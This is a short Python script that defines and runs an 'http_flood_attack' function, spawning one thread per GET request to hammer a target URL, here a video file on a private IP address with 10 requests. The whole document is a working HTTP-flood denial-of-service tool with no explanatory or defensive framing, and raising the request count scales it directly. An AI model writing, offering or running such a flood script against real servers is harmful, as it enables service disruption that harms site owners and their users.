import threading
import requests
def send_get_request(url):
    try:
        response = requests.get(url)
        print(f"Sent GET request to {url}, Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def http_flood_attack(url, num_requests):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_get_request, args=(url,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

target_url = "http://172.18.54.56/video1.mp4"
num_requests = 10
http_flood_attack(target_url, num_requests)